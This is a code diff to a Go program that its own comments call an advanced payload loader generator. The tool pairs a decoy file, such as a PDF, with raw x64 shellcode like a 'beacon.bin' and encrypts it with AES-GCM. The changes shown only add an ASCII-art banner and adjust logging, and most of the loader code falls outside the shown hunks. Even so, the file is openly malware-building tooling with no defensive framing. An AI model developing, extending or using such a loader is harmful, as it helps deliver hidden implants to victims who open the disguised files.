@@ -1,6 +1,7 @@
 // 文件名: generator.go
 //
 // GoFilePacker: 高级 Go 语言荷载加载器生成器 (最终版 - Fire and Forget)
+
 package main
 
 import (
@@ -17,6 +18,17 @@ import (
 	"path/filepath"
 	"text/template"
 )
+
+const logo = `
+   ______      ____  _                          _   
+  / ____/___  / __ \(_)___  ____  ___  _________/ |  
+ / / __/ __ \/ /_/ / / __ \/ __ \/ _ \/ ___/ __  /   
+/ /_/ / /_/ / ____/ / / / / / / /  __/ /  / /_/ /    
+\____/\____/_/   /_/_/ /_/_/ /_/\___/_/   \__,_/     
+                                                    
+              >> Advanced Payload Loader Generator <<
+                                           by hsad
+`
 
 // loaderTemplate 是最终加载器可执行文件的 Go 源代码。
 const loaderTemplate = `
@@ -196,8 +208,9 @@ func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
 }
 
 func main() {
-	log.Println("GoFilePacker")
-	log.Println("---------------------------------------------------------")
+	// [+] 修改点: 打印 Logo 替换旧的标题
+	log.SetFlags(0) // 移除 log 的时间戳等前缀，让 Logo 更干净
+	log.Println(logo)
 
 	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or TXT).")
 	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
